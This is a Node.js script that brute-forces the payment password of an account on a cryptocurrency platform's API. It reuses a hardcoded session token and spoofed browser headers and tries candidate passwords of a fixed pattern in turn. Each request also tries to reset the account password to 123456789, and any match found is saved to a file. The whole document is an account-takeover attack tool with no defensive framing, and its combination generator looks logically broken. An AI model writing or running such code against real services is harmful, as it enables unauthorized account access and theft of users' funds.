const axios = require('axios');
const fs = require('fs');
const { promisify } = require('util');

// Promisify fs.writeFile to use async/await
const writeFileAsync = promisify(fs.writeFile);

// URL and headers
const url = "https://api.coinsus.top/addons/cos/user/changePwd?lang=";
const headers = {
    "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24"',
    "Accept-Language": "en",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
    "Content-Type": "application/json",
    "Platform": "H5",
    "Token": "572ae635-06f3-4dc6-9bbf-4652470e7893",
    "Sec-Ch-Ua-Platform": '"macOS"',
    "Accept": "*/*",
    "Origin": "https://crygn.com",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://crygn.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i"
};

// Possible characters (lowercase letters and digits)
const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';

// Function to generate combinations
function* generateCombinations(characters, length) {
    const combos = new Array(length).fill(characters.split(''));
    while (combos.length > 0) {
        yield combos.reduce((a, b) => a.flatMap(x => b.map(y => x + y)));
        for (let i = combos.length - 1; i >= 0; i--) {
            combos[i].push(...characters.split(''));
            if (combos[i].length >= characters.length) {
                combos[i] = [characters.split('')[0]];
                if (i === 0) {
                    combos.unshift([characters.split('')[0]]);
                }
            } else {
                break;
            }
        }
    }
}

// Main function to find the password
async function findPassword() {
    const combinations = generateCombinations(characters, 3);

    for (let combo of combinations) {
        const paymentPassword = `hu${combo.join('')}03`;
        const data = {
            newPassword: "123456789",
            confirmPassword: "123456789",
            walletAddress: "",
            paymentPassword: paymentPassword,
            type: "1"
        };

        try {
            const response = await axios.post(url, data, { headers });
            if (response.status === 200) {
                const msg = response.data.msg;
                if (msg !== "Incorrect payment password") {
                    console.log(`Success! Found paymentPassword: ${paymentPassword}`);

                    // Save password to a text file
                    await writeFileAsync('found_password.txt', paymentPassword);
                    return; // Exit function since we found the password
                } else {
                    console.log(`Tried paymentPassword: ${paymentPassword} - Incorrect password`);
                }
            } else {
                console.log(`Tried paymentPassword: ${paymentPassword} - Error: ${response.status}`);
            }
        } catch (error) {
            console.error(`Error trying paymentPassword: ${paymentPassword}`, error.message);
        }
    }

    console.log("Failed to find paymentPassword. Try another approach.");
}

// Call the main function to start finding the password
findPassword();
